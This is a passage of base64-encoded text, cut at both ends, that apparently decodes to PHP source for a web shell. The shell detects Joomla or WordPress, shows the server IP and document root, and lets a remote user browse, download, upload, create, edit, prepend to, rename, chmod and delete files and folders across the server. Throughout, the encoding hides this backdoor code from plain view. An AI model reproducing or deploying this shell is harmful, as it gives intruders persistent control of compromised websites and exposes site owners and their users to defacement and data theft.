VhZGVyKCdDYWNoZS1Db250cm9sOiBtdXN0LXJldmFsaWRhdGUnKTsKCQloZWFkZXIoJ1ByYWdtYTogcHVibGljJyk7CgkJaGVhZGVyKCdDb250ZW50LUxlbmd0aDogJyAuIGZpbGVzaXplKCRmaWxlX2Zvcl9zYXZlKSk7CgkJcmVhZGZpbGUoJF9HRVRbJ2Rvd25sb2FkJ10pOwoJCWV4aXQ7Cgl9Cn0KPz4KPD9waHAKLy9zZXRfdGltZV9saW1pdCAoMCk7CgpmdW5jdGlvbiBnZXRfZmlsZXNpemUoJGZpbGUpCnsKCWlmKCFmaWxlX2V4aXN0cygkZmlsZSkpIHJldHVybiAiw5DCpMOQwrDDkMK5w5DCuyAgw5DCvcOQwrUgw5DCvcOQwrDDkMK5w5DCtMOQwrXDkMK9IjsKCSRmaWxlc2l6ZSA9IGZpbGVzaXplKCRmaWxlKTsKICAgaWYoJGZpbGVzaXplID4gMTAyNCkKICAgewogICAgICAgJGZpbGVzaXplID0gKCRmaWxlc2l6ZS8xMDI0KTsKICAgICAgIGlmKCRmaWxlc2l6ZSA+IDEwMjQpCiAgICAgICB7CiAgICAgICAgICAgICRmaWxlc2l6ZSA9ICgkZmlsZXNpemUvMTAyNCk7CiAgICAgICAgICAgaWYoJGZpbGVzaXplID4gMTAyNCkKICAgICAgICAgICB7CiAgICAgICAgICAgICAgICRmaWxlc2l6ZSA9ICgkZmlsZXNpemUvMTAyNCk7CiAgICAgICAgICAgICAgICRmaWxlc2l6ZSA9IHJvdW5kKCRmaWxlc2l6ZSwgMSk7CiAgICAgICAgICAgICAgIHJldHVybiAkZmlsZXNpemUuIiBnYiI7ICAgICAgIAogICAgICAgICAgIH0KICAgICAgICAgICBlbHNlCiAgICAgICAgICAgewogICAgICAgICAgICAgICAkZmlsZXNpemUgPSByb3VuZCgkZmlsZXNpemUsIDEpOwogICAgICAgICAgICAgICByZXR1cm4gJGZpbGVzaXplLiIgbWIiOyAgIAogICAgICAgICAgIH0gICAgICAgCiAgICAgICB9CiAgICAgICBlbHNlCiAgICAgICB7CiAgICAgICAgICAgJGZpbGVzaXplID0gcm91bmQoJGZpbGVzaXplLCAxKTsKICAgICAgICAgICByZXR1cm4gJGZpbGVzaXplLiIga2IiOyAgIAogICAgICAgfSAgCiAgIH0KICAgZWxzZQogICB7CiAgICAgICAkZmlsZXNpemUgPSByb3VuZCgkZmlsZXNpemUsIDEpOwogICAgICAgcmV0dXJuICRmaWxlc2l6ZS4iIGIiOyAgIAogICB9Cn0KCmZ1bmN0aW9uIGdldF90aW1lKCRmaWxlKQp7CglpZighZmlsZV9leGlzdHMoJGZpbGUpKSByZXR1cm4gIm5vIGluZm8iOwoJCgkkbGFzdF91cGRhdGUgPSBmaWxlbXRpbWUoJGZpbGUpOwoJJHRpbWUgPSBkYXRlKCdZLW0tZCBIOmk6cycsICRsYXN0X3VwZGF0ZSk7CgkKCXJldHVybiAkdGltZTsKfQoKCgoKCgpmdW5jdGlvbiBDTVMoKQp7CglpZiAoKGlzX2RpcigkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddLicvYWRtaW5pc3RyYXRvci8nKSkgYW5kIChpc19kaXIoJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXS4nL2NvbXBvbmVudHMvJykpIGFuZCAoaXNfZGlyKCRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10uJy9pbmNsdWRlcy8nKSkpCgkJcmV0dXJuICJKb29tbGEhIjsKCWVsc2VpZiAoKGlzX2RpcigkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddLicvd3AtY29udGVudC8nKSkgYW5kIChpc19kaXIoJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXS4nL3dwLWFkbWluLycpKSBhbmQgKGlzX2RpcigkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddLicvd3AtaW5jbHVkZXMvJykpKQoJCXJldHVybiAiV29yZFByZXNzIjsgCgllbHNlCgkJcmV0dXJuICJVbmtub3duIjsKfQpmdW5jdGlvbiBmb2xkZXJfc2VwYXJhdGUoJHBhdGgpCnsKCSRwb3NfZW5kID0gc3Rycmlwb3MoJHBhdGgsICcvJyk7CgkkcGF0aDIgPSBzdWJzdHJfcmVwbGFjZSgkcGF0aCwgJycsICRwb3NfZW5kLCA5OTk5OSk7CgkJCQkKCXJldHVybiAkcGF0aDI7Cn0KCmZ1bmN0aW9uIHNpZGVfYmFyKCRtYWtlX2ZpbGUpCnsKCWVjaG8gJzx0ZCBhbGlnbj0icmlnaHQiIGNvbHNwYW49IjIiPic7CgkKCWVjaG8gIjxmb3JtIGFjdGlvbiA9ICciLiRtYWtlX2ZpbGUuIicgbWV0aG9kID0gJ1BPU1QnPiI7CgllY2hvICI8aW5wdXQgbmFtZT1cInNlYXJjaF9maWxlXCIgc2l6ZT1cIjdcIiB0eXBlPVwidGV4dFwiIHBsYWNlaG9sZGVyPVwiLnN1c3BlY3RlZFwiIC8+IjsKCWVjaG8gIjxpbnB1dCB0eXBlPVwic3VibWl0XCIgdmFsdWU9XCJva1wiIC8+PC9mb3JtPiI7CgkKCWVjaG8gIjxmb3JtIGFjdGlvbiA9ICciLiRtYWtlX2ZpbGUuIicgbWV0aG9kID0gJ1BPU1QnPiI7CgllY2hvICI8aW5wdXQgbmFtZT1cIm5ld19maWxlXCIgc2l6ZT1cIjdcIiB0eXBlPVwidGV4dFwiIHBsYWNlaG9sZGVyPVwibWFrZSBmaWxlXCIgLz4iOwoJZWNobyAiPGlucHV0IHR5cGU9XCJzdWJtaXRcIiB2YWx1ZT1cIm9rXCIgLz48L2Zvcm0+IjsKCQkJCQoJZWNobyAiPGZvcm0gYWN0aW9uID0gJyIuJG1ha2VfZmlsZS4iJyBtZXRob2QgPSAnUE9TVCc+IjsKCWVjaG8gIjxpbnB1dCBuYW1lPVwibmV3X2RpclwiIHNpemU9XCI3XCIgdHlwZT1cInRleHRcIiBwbGFjZWhvbGRlcj1cIm1ha2UgZGlyXCIgLz4iOwoJZWNobyAiPGlucHV0IHR5cGU9XCJzdWJtaXRcIiB2YWx1ZT1cIm9rXCIgLz48L2Zvcm0+IjsKCWVjaG8gJzwvdGQ+PC90cj4nOwp9CgppZiAoaXNzZXQoJF9HRVRbJ3JlbmFtZSddKSkKewoJaWYgKCFlbXB0eSgkX1BPU1QgWyduX25hbWUnXSkpCgl7CgkJaWYgKHJlbmFtZSgkX0dFVFsncmVuYW1lJ10sICRfUE9TVCBbJ25fbmFtZSddKSkKCQkJJG1lc3NhZ2VfcmVuYW1lID0gJzxmb250IGNvbG9yPSJncmVlbiI+PGI+TmFtZSBjaGFuZ2VkITwvYj48L2ZvbnQ+JzsKCQllbHNlCgkJCSRtZXNzYWdlX3JlbmFtZSA9ICc8Zm9udCBjb2xvcj0icmVkIj48Yj5OYW1lIGNhbiBub3QgYmUgY2hhbmdlZDwvYj48L2ZvbnQ+JzsKCQkJCgkJZWNobyAkbWVzc2FnZV9yZW5hbWU7Cgl9Cn0KCmZ1bmN0aW9uIGVkaXRfZmlsZSgkZmlsZSwgJGN1cnJlbnQpCnsKCWlmICghZW1wdHkoJF9QT1NUWydjaG0nXSkpCgl7CgkJaWYgKCRfUE9TVFsnY2htJ10gPT0gJzA3NTUnKQoJCXsKCQkJaWYgKGNobW9kKCRmaWxlLCAwNzU1KSkKCQkJCSRtZXNzYWdlX2NobW9kID0gJzxmb250IGNvbG9yPSJncmVlbiI+PGI+UGVybWlzc2lvbiBjaGFuZ2VkITwvYj48L2ZvbnQ+JzsKCQkJZWxzZQoJCQkJJG1lc3NhZ2VfY2htb2QgPSAnPGZvbnQgY29sb3I9InJlZCI+PGI+VW5hYmxlIGNoYW5nZSBwZXJtaXNzaW9uITwvYj48L2ZvbnQ+JzsKCQl9CgkJZWxzZWlmICgkX1BPU1RbJ2NobSddID09ICcwNDQ0JykKCQl7CgkJCWlmIChjaG1vZCgkZmlsZSwgMDQ0NCkpCgkJCQkkbWVzc2FnZV9jaG1vZCA9ICc8Zm9udCBjb2xvcj0iZ3JlZW4iPjxiPlBlcm1pc3Npb24gY2hhbmdlZCE8L2I+PC9mb250Pic7CgkJCWVsc2UKCQkJCSRtZXNzYWdlX2NobW9kID0gJzxmb250IGNvbG9yPSJyZWQiPjxiPlVuYWJsZSBjaGFuZ2UgcGVybWlzc2lvbiE8L2I+PC9mb250Pic7CgkJfQoJCWVsc2VpZiAoJF9QT1NUWydjaG0nXSA9PSAnMDY0NCcpCgkJewoJCQlpZiAoY2htb2QoJGZpbGUsIDA2NDQpKQoJCQkJJG1lc3NhZ2VfY2htb2QgPSAnPGZvbnQgY29sb3I9ImdyZWVuIj48Yj5QZXJtaXNzaW9uIGNoYW5nZWQhPC9iPjwvZm9udD4nOwoJCQllbHNlCgkJCQkkbWVzc2FnZV9jaG1vZCA9ICc8Zm9udCBjb2xvcj0icmVkIj48Yj5VbmFibGUgY2hhbmdlIHBlcm1pc3Npb24hPC9iPjwvZm9udD4nOwoJCX0KCQllbHNlCgkJCSRtZXNzYWdlX2NobW9kID0gJzA3NTU8YnI+MDQ0NDxicj4wNjQ0PGJyPic7CgkJCgkJZWNobyAkbWVzc2FnZV9jaG1vZDsKCX0KCWlmIChlbXB0eSgkX1BPU1RbJ25ldyddKSkKCXsKCQkkcG9zX2VuZCA9IHN0cnJpcG9zKCRmaWxlLCAnLycpOwoJCSRkaXIgPSBzdWJzdHJfcmVwbGFjZSgkZmlsZSwgJycsICRwb3NfZW5kLCA5OTk5OSk7CgoJCWlmIChmaWxlX2V4aXN0cygkZmlsZSkgYW5kIChmaWxlc2l6ZSgkZmlsZSk+MSkpCgkJewoJCQlpZiAoISRmcCA9IGZvcGVuICgkZmlsZSwgInIiKSkKCQkJewoJCQkJZWNobyAnbm8gaGF2ZSBwZXJtaXNzaW9uPGJyPic7CgkJCQkkZmlsZV9jb250ID0gJ2NhblwndCBzaG93JzsKCQkJfQoJCQllbHNlCgkJCXsKCQkJCSRmaWxlX2NvbnQgPSBmcmVhZCAoJGZwLCBmaWxlc2l6ZSAoJGZpbGUpKTsKCQkJCWZjbG9zZSAoJGZwKTsKCQkJfQoJCX0KCQllbHNlCgkJCSRmaWxlX2NvbnQgPSAnJzsKCQkKCQkkZmlsZV9jb250ID0gc3RyX3JlcGxhY2UgKCI8dGV4dGFyZWE+IiwgIjx0ZXh0YXJlYT4iLCAkZmlsZV9jb250KTsKCQkkZmlsZV9jb250ID0gaHRtbHNwZWNpYWxjaGFycygkZmlsZV9jb250KTsKCgkJZWNobyAiPHRyPjx0ZCBhbGlnbj1cImNlbnRlclwiIGNvbHNwYW49XCI1XCI+PGZvcm0gYWN0aW9uID0gJ2h0dHA6Ly8iLiRjdXJyZW50LiI\/ZWRpdD0iLiRmaWxlLiImZGlyPSIuJGRpci4iJyBtZXRob2QgPSAnUE9TVCc+XG4iOwoJCWVjaG8gIkZpbGU6ICIuICRmaWxlIC4gIjxicj5cbiI7CgkJZWNobyAiPHRleHRhcmVhIG5hbWUgPSAnbmV3JyByb3dzID0gJzIwJyBjb2xzID0gJzEyMCc+Ii4kZmlsZV9jb250LiI8L3RleHRhcmVhPjxicj5cbiI7CgkJZWNobyAiPGRpdiBhbGlnbj1cInJpZ2h0XCI+PGJyPjxpbnB1dCB0eXBlID0gJ3N1Ym1pdCcgdmFsdWUgPSAnU2F2ZSc+PC9kaXY+PC9mb3JtPjwvdGQ+PC90cj5cbiI7CgkJCgkJZWNobyAiPHRyPjx0ZCBhbGlnbj1cImxlZnRcIj48Zm9ybSBhY3Rpb24gPSAnaHR0cDovLyIuJGN1cnJlbnQuIj9lZGl0PSIuJGZpbGUuIiZkaXI9Ii4kZGlyLiInIG1ldGhvZCA9ICdQT1NUJz5cbiI7CgkJZWNobyAiPGlucHV0IG5hbWU9XCJjaG1cIiBzaXplPVwiNFwiIHR5cGU9XCJ0ZXh0XCIgcGxhY2Vob2xkZXI9XCIiLnBlcm1zKCRmaWxlLCAnMScpLiJcIi8+IjsKCQllY2hvICI8aW5wdXQgdHlwZT1cInN1Ym1pdFwiIHZhbHVlPVwib2tcIiAvPjwvZm9ybT48L3RkPlxuIjsKCQkKCQllY2hvICI8dGQgY29sc3Bhbj1cIjNcIiBhbGlnbj1cImxlZnRcIj48Zm9ybSBhY3Rpb24gPSAnaHR0cDovLyIuJGN1cnJlbnQuIj9yZW5hbWU9Ii4kZmlsZS4iJmRpcj0iLiRkaXIuIicgbWV0aG9kID0gJ1BPU1QnPlxuIjsKCQllY2hvICI8aW5wdXQgdHlwZT1cInRleHRcIiBuYW1lPSduX25hbWUnIHNpemU9XCI3MlwiIHZhbHVlPVwiJGZpbGVcIj4iOwoJCWVjaG8gIjxpbnB1dCB0eXBlPVwic3VibWl0XCIgdmFsdWU9XCJva1wiIC8+PC9mb3JtPjwvdGQ+PC90cj5cbiI7Cgl9CgllbHNlIAoJewoJCWlmICghZW1wdHkoJF9QT1NUWyduZXdfcmVtb3RlJ10pKQoJCXsKCQkJaWYgKCFjaG1vZCgkZmlsZSwgMDc1NSkpCgkJCQlyZXR1cm4gIm5vIGhhdmUgcGVybWlzc2lvbiBmb3IgY2htb2QhIjsKCQkJCgkJCSRmaWxlX2NvbnQgPSBvbmx5X3JlYWQoJGZpbGUpOwoJCQkkZmlsZV9jb250ID0gJF9QT1NUWyduZXcnXS4kZmlsZV9jb250OwoJCQkKCQkJJGZwID0gZm9wZW4gKCRmaWxlLCAidyIpOwoJCQlpZiAoZndyaXRlICgkZnAsICRmaWxlX2NvbnQpKQoJCQkJJG1lc3NhZ2UgPSAnIC0gPGZvbnQgY29sb3I9ImdyZWVuIj48Yj5FZGl0ZWQhPC9iPjwvZm9udD4nOwoJCQllbHNlCgkJCQkkbWVzc2FnZSA9ICcgLSA8Zm9udCBjb2xvcj0icmVkIj48Yj5VbmFibGUgdG8gZWRpdCE8L2I+PC9mb250Pic7CgkJCWZjbG9zZSAoJGZwKTsKCQkJaWYgKCFjaG1vZCgkZmlsZSwgMDQ0NCkpCgkJCQlyZXR1cm4gIm5vIGhhdmUgcGVybWlzc2lvbiBmb3IgY2htb2QhIjsKCQl9CgkJZWxzZQoJCXsKCQkJaWYgKCFjaG1vZCgkZmlsZSwgMDc1NSkpCgkJCQlyZXR1cm4gIm5vIGhhdmUgcGVybWlzc2lvbiBmb3IgY2htb2QhIjsKCQkJCgkJCSRmcCA9IGZvcGVuICgkZmlsZSwgInciKTsKCQkJaWYgKGZ3cml0ZSAoJGZwLCAkX1BPU1QgWyduZXcnXSkpCgkJCQkkbWVzc2FnZSA9ICcgLSA8Zm9udCBjb2xvcj0iZ3JlZW4iPjxiPkVkaXRlZCE8L2I+PC9mb250Pic7CgkJCWVsc2UKCQkJCSRtZXNzYWdlID0gJyAtIDxmb250IGNvbG9yPSJyZWQiPjxiPlVuYWJsZSB0byBlZGl0ITwvYj48L2ZvbnQ+JzsKCQkJZmNsb3NlICgkZnApOwoJCX0KCQkKCQkkcG9zX2VuZCA9IHN0cnJpcG9zKCRmaWxlLCAnLycpOwoJCSRkaXIgPSBzdWJzdHJfcmVwbGFjZSgkZmlsZSwgJycsICRwb3NfZW5kLCA5OTk5OSk7CgoJCSRmcCA9IGZvcGVuICgkZmlsZSwgInIiKTsKCQkkZmlsZV9jb250ID0gZnJlYWQgKCRmcCwgZmlsZXNpemUgKCRmaWxlKSk7CgkJZmNsb3NlICgkZnApOwoJCQoJCQoJCSRmaWxlX2NvbnQgPSBzdHJfcmVwbGFjZSAoIjx0ZXh0YXJlYT4iLCAiPHRleHRhcmVhPiIsICRmaWxlX2NvbnQpOwoJCQoJCWVjaG8gIjx0cj48dGQgYWxpZ249XCJjZW50ZXJcIiBjb2xzcGFuPVwiNVwiPjxmb3JtIGFjdGlvbiA9ICdodHRwOi8vIi4kY3VycmVudC4iP2VkaXQ9Ii4kZmlsZS4iJmRpcj0iLiRkaXIuIicgbWV0aG9kID0gJ1BPU1QnPlxuIjsKCQllY2hvICJGaWxlOiAiLiAkZmlsZSAuICRtZXNzYWdlIC4gIjxicj5cbiI7CgkJZWNobyAiPHRleHRhcmVhIG5hbWUgPSAnbmV3JyByb3dzID0gJzIwJyBjb2xzID0gJzEyMCc+Ii4kZmlsZV9jb250LiI8L3RleHRhcmVhPjxicj5cbiI7CgkJZWNobyAiPGRpdiBhbGlnbj1cInJpZ2h0XCI+PGJyPjxpbnB1dCB0eXBlID0gJ3N1Ym1pdCcgdmFsdWUgPSAnU2F2ZSc+PC9kaXY+PC9mb3JtPjwvdGQ+PC90cj5cbiI7CgkJCgkJZWNobyAiPHRyPjx0ZCBhbGlnbj1cImxlZnRcIj48Zm9ybSBhY3Rpb24gPSAnaHR0cDovLyIuJGN1cnJlbnQuIj9lZGl0PSIuJGZpbGUuIiZkaXI9Ii4kZGlyLiInIG1ldGhvZCA9ICdQT1NUJz5cbiI7CgkJZWNobyAiPGlucHV0IG5hbWU9XCJjaG1cIiBzaXplPVwiNFwiIHR5cGU9XCJ0ZXh0XCIgcGxhY2Vob2xkZXI9XCIiLnBlcm1zKCRmaWxlLCAnMScpLiJcIi8+IjsKCQllY2hvICI8aW5wdXQgdHlwZT1cInN1Ym1pdFwiIHZhbHVlPVwib2tcIiAvPjwvZm9ybT48L3RkPlxuIjsKCQkKCQllY2hvICI8dGQgY29sc3Bhbj1cIjNcIiBhbGlnbj1cImxlZnRcIj48Zm9ybSBhY3Rpb24gPSAnaHR0cDovLyIuJGN1cnJlbnQuIj9yZW5hbWU9Ii4kZmlsZS4iJmRpcj0iLiRkaXIuIicgbWV0aG9kID0gJ1BPU1QnPlxuIjsKCQllY2hvICI8aW5wdXQgdHlwZT1cInRleHRcIiBuYW1lPSduX25hbWUnIHNpemU9XCI3MlwiIHZhbHVlPVwiJGZpbGVcIj4iOwoJCWVjaG8gIjxpbnB1dCB0eXBlPVwic3VibWl0XCIgdmFsdWU9XCJva1wiIC8+PC9mb3JtPjwvdGQ+PC90cj5cbiI7CgkJCgkJaWYgKGNobW9kKCRmaWxlLCAwNDQ0KSkKCQkJJG1lc3NhZ2VfY2htb2RfbGFzdCA9ICc8Zm9udCBjb2xvcj0iZ3JlZW4iPjxiPlBlcm1pc3Npb24gY2hhbmdlZCE8L2I+PC9mb250Pic7CgkJZWxzZQoJCQkkbWVzc2FnZV9jaG1vZF9sYXN0ID0gJzxmb250IGNvbG9yPSJyZWQiPjxiPlVuYWJsZSBjaGFuZ2UgcGVybWlzc2lvbiE8L2I+PC9mb250Pic7Cgl9CgkKfQoKaWYgKGlzc2V0ICgkX0dFVFsnZGVsJ10pKQp7CglpZiAoaXNfZGlyKCRfR0VUWydkZWwnXSkpCgkJY2xlYXJfZm9sZGVyKCRfR0VUWydkZWwnXSk7CgllbHNlCgkJZGVsX2ZpbGUoJF9HRVRbJ2RlbCddKTsKCQp9CgokZG9tYWluID0gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ107CiRzY3JpcHRfcGF0aCA9ICRfU0VSVkVSWydTQ1JJUFRfTkFNRSddOwokYXJyX2ZvbGRlciA9IGFycmF5KCk7CiRhcnJfZmlsZW5hbWVzID0gYXJyYXkoKTsKPz4KCTx0ciBhbGlnbj0ibGVmdCI+CgkJPHRkIGNvbHNwYW49IjMiPgoJCTw\/cGhwCgkJaWYgKHNpemVvZigkX0ZJTEVTKSE9MCkKCQl7CQoJCQlpZihpc3NldCgkX0ZJTEVTKSAmJiAkX0ZJTEVTWydpbnB1dGZpbGUnXVsnZXJyb3InXSA9PSAwKQoJCQl7CgkJCQlpZiAoaXNzZXQgKCRfR0VUWydkaXInXSkpCgkJCQkJJHBhdGggPSAkX0dFVFsnZGlyJ107CgkJCQllbHNlCgkJCQkJJHBhdGggPSAkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddOwoJCQkJCQoJCQkJJGRlc3RpYXRpb25fZGlyID0gJHBhdGggLicvJy4kX0ZJTEVTWydpbnB1dGZpbGUnXVsnbmFtZSddOwoJCQkJbW92ZV91cGxvYWRlZF9maWxlKCRfRklMRVNbJ2lucHV0ZmlsZSddWyd0bXBfbmFtZSddLCAkZGVzdGlhdGlvbl9kaXIgKTsKCQkJCQoJCQkJJG9wZW5fdXBsb2FkX2ZpbGUgPSBzdHJfcmVwbGFjZSgkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddLCAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSwgJGRlc3RpYXRpb25fZGlyKTsgCgkJCQllY2hvICc8Zm9udCBjb2xvcj0iZ3JlZW4iPjxiPicuIjxhIHRhcmdldD1cIl9ibGFua1wiIGhyZWY9XCJodHRwOi8vJG9wZW5fdXBsb2FkX2ZpbGVcIj5GaWxlIFVwbG9hZGVkITwvYT4iLic8L2I+PC9mb250Pic7CgkJCX0KCQl9CgkJZWxzZWlmKHNpemVvZigkX0ZJTEVTKSE9MCkKCQkJZWNobyAnPGZvbnQgY29sb3I9InJlZCI+PGI+Tm8gRmlsZSBVcGxvYWRlZDwvYj48L2ZvbnQ+JzsKCQkJCQoJCWlmIChpc3NldCAoJF9HRVRbJ2RpciddKSkKCQkJJHBhdGhfZm9yX3VwbG9hZCA9ICRfU0VSVkVSWydTQ1JJUFRfTkFNRSddLic\/ZGlyPScuJF9HRVRbJ2RpciddOwoJCWVsc2UKCQkJJHBhdGhfZm9yX3VwbG9hZCA9ICRfU0VSVkVSWydTQ1JJUFRfTkFNRSddLic\/ZGlyPScuJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXTsKCQkJPz4KCQkJPGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249Ijw\/cGhwIGVjaG8gJHBhdGhfZm9yX3VwbG9hZDs\/PiIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+CgkJCTxpbnB1dCB0eXBlPSJmaWxlIiBpZD0iaW5wdXRmaWxlIiBuYW1lPSJpbnB1dGZpbGUiPgoJCQk8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0ib2siPgoJCQk8L2Zvcm0+CgkJCUNNUzogPD9waHAgZWNobyBDTVMoKTs\/Pjxicj4KCQkJU2VydmVyIElQOiA8P3BocCBlY2hvICRfU0VSVkVSWydTRVJWRVJfQUREUiddOz8+PGJyPgoJCQlSb290OiA8P3BocCBlY2hvICc8YSBocmVmPSInLidodHRwOi8vJy4kZG9tYWluLiRzY3JpcHRfcGF0aC4nP2Rpcj0nLiRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10uJyI+Jy4kX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddLic8L2E+JzsgPz4KCQkJPGJyPjxicj4KCQkJRGlyZWN0b3J5OiAKCQkJPD9waHAgCgkJCWlmIChpc3NldCAoJF9HRVRbJ2RpciddKSkgCgkJCQkkcGF0aCA9ICRfR0VUWydkaXInXTsKCQkJZWxzZQoJCQkJJHBhdGggPSAkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddOwoJCgkJCQoJCQkkYXJyX3BhdGggPSBleHBsb2RlKCIvIiwgJHBhdGgpOwoJCQkkc2xlc2hfY291bnQgPSBjb3VudCgkYXJyX3BhdGgpLTE7CgoJCQkkYXJyX2xpbmtzID0gYXJyYXkoKTsKCQkJJHBhdGhfZm9yX3dvcmsgPSAkcGF0aDsKCQkJCgkJCWZvciAoJGk9MTsgJGkgPD0gJHNsZXNoX2NvdW50OyAkaSsrKQoJCQl7CgkJCQkkcGF0aF9mb3Jfd29yayA9IGZvbGRlcl9zZXBhcmF0ZSgkcGF0aF9mb3Jfd29yayk7CgkJCQkkYXJyX2xpbmtzW10gPSAkcGF0aF9mb3Jfd29yazsKCQkJfQoJCQlmb3IgKCRpPTE7ICRpIDw9ICRzbGVzaF9jb3VudDsgJGkrKykKCQkJewoJCQkJJGsgPSAkc2xlc2hfY291bnQgLSAkaSAtIDE7CgkJCQlpZiAoJGkgIT09ICRzbGVzaF9jb3VudCkKCQkJCQllY2hvICc8YSBocmVmPSJodHRwOi8vJy4kZG9tYWluLiRzY3JpcHRfcGF0aC4nP2Rpcj0nLiRhcnJfbGlua3NbIiRrIl0uJyI+Jy4kYXJyX3BhdGhbIiRpIl0uJzwvYT4vJzsKCQkJCWVsc2UKCQkJCQllY2hvICc8YSBocmVmPSJodHRwOi8vJy4kZG9tYWluLiRzY3JpcHRfcGF0aC4nP2Rpcj0nLiRwYXRoLiciPicuJGFycl9wYXRoWyIkaSJdLic8L2E+JzsKCQkJfQoJCQk\/PgoJCQkKCQkJCgkJPC90ZD4KCTw\/cGhwCgkKCQlpZiAoaXNzZXQgKCRfR0VUWydkaXInXSkpCgkJewoJCQlpZiAoaXNzZXQgKCRfUE9TVFsnbmV3X2ZpbGVfbmFtZSddKSkKCQkJewoJCQkJJG5ld19maWxlID0gJF9HRVRbJ2RpciddIC4gJy8nIC4gJF9QT1NUWyduZXdfZmlsZV9uYW1lJ107CgkJCQkkbWFrZV9maWxlID0gJ2h0dHA6Ly8nIC4gJGRvbWFpbiAuICRzY3JpcHRfcGF0aCAuICc\/ZGlyPScgLiAkX0dFVFsnZGlyJ10gLiAnJmVkaXQ9JyAuICRuZXdfZmlsZTsKCQkJfQoJCQllbHNlCgkJCQkkbWFrZV9maWxlID0gJ2h0dHA6Ly8nIC4gJGRvbWFpbiAuICRzY3JpcHRfcGF0aCAuICc\/ZGlyPScgLiAkX0dFVFsnZGlyJ107CgkJfQoJCWVsc2UKCQl7CgkJCWlmIChpc3NldCAoJF9QT1NUWyduZXdfZmlsZV9uYW1lJ10pKQoJCQl7CgkJCQkkbmV3X2ZpbGUgPSAkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddLiAnLycgLiAkX1BPU1RbJ25ld19maWxlX25hbWUnXTsKCQkJCSRtYWtlX2ZpbGUgPSAnaHR0cDovLycgLiAkZG9tYWluIC4gJHNjcmlwdF9wYXRoIC4gJz9kaXI9JyAuICRfR0VUWydkaXInXSAuICcmZWRpdD0nIC4gJG5ld19maWxlOwoJCQl9CgkJCWVsc2UKCQkJCSRtYWtlX2ZpbGUgPSAnaHR0cDovLycgLiAkZG9tYWluIC4gJHNjcmlwdF9wYXRoIC4gJz9kaXI9JyAuICRfU0VSVkVSWydET0NVTUVOVF9ST09UJ107CgkJfQkKCQoJCgkKCQlpZiAoKGVtcHR5KCRfUE9TVCBbJ25ld19maWxlJ10pKSBhbmQgKGVtcHR5KCRfUE9TVCBbJ3NlYXJjaF9maWxlJ10pKSBhbmQgKGVtcHR5KCRfUE9TVCBbJ25ld19kaXInXSkpKQoJCXsKCQkJaWYgKGlzc2V0ICgkX0dFVFsnZGlyJ10pKQoJCQkJJHBhdGggPSAkX0dFVFsnZGlyJ107CgkJCWVsc2UKCQkJCSRwYXRoID0gJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXTsKCQkJCgkJCSRtYWtlX2ZpbGUgPSAnaHR0cDovLycgLiAkZG9tYWluIC4gJHNjcmlwdF9wYXRoIC4gJz9kaXI9JyAuICRwYXRoOwoJCQkKCQkJc2lkZV9iYXIoJG1ha2VfZmlsZSk7CgkJfQoJCWVsc2VpZiAoIWVtcHR5KCRfUE9TVCBbJ25ld19maWxlJ10pKQoJCXsKCQkJaWYgKGlzc2V0ICgkX0dFVFsnZGlyJ10pKQoJCQkJJHBhdGggPSAkX0dFVFsnZGlyJ10uJy8nLiRfUE9TVCBbJ25ld19maWxlJ107CgkJCWVsc2UKCQkJCSRwYXRoID0gJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXS4nLycuJF9QT1NUIFsnbmV3X2ZpbGUnXTsKCQkJCgkJCSRtYWtlX2ZpbGUgPSAnaHR0cDovLycgLiAkZG9tYWluIC4gJHNjcmlwdF9wYXRoIC4gJz9kaXI9JyAuICRfR0VUWydkaXInXSAuICcmZWRpdD0nIC4gJHBhdGg7CgoJCQlpZiAoJGZwID0gZm9wZW4gKCRwYXRoLCAidyIpKQoJCQl7CgkJCQllY2hvICc8Zm9udCBjb2xvcj0iZ3JlZW4iPkZpbGUgY3JlYXRlZCBzdWNjZXNzZnVsbHkhPC9mb250Pic7CgkJCQlzaWRlX2JhcigkbWFrZV9maWxlKTsKCQkJfQoJCQllbHNlCgkJCXsKCQkJCWVjaG8gJzxmb250IGNvbG9yPSJyZWQiPkNhbiBub3QgY3JlYXRlITwvZm9udD4nOwoJCQkJc2lkZV9iYXIoJG1ha2VfZmlsZSk7CgkJCX0KCQkJZmNsb3NlICgkZnApOwoJCX0KCQllbHNlaWYgKCFlbXB0eSgkX1BPU1RbJ25ld19kaXInXSkpCgkJewoJCQlpZiAoaXNzZXQoJF9HRVRbJ2RpciddKSkKCQkJCSRwYXRoID0gJF9HRVRbJ2RpciddLicvJy4kX1BPU1RbJ25ld19kaXInXTsKCQkJZWxzZQoJCQkJJHBhdGggPSAkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddLicvJy4kX1BPU1RbJ25ld19kaXInXTsKCQkJCgkJCSRtYWtlX2ZpbGUgPSAnaHR0cDovLycgLiAkZG9tYWluIC4gJHNjcmlwdF9wYXRoIC4gJz9kaXI9JyAuICRfR0VUWydkaXInXSAuICcmbmV3X2Rpcj0nIC4gJHBhdGg7CgoJCQlpZiAoJGZwID0gbWtkaXIoJHBhdGgpKQoJCQl7CgkJCQlzaWRlX2JhcigkbWFrZV9maWxlKTsKCQkJCWVjaG8gIjx0ciBhbGlnbj1cImNlbnRlclwiPjx0ZCBhbGlnbj1cImxlZnRcIiA+Ii4iPGZvbnQgY29sb3I9XCJncmVlblwiPkZvbGRlciBjcmVhdGVkIHN1Y2Nlc3NmdWxseSE8L2ZvbnQ+PC90ZD4iLiI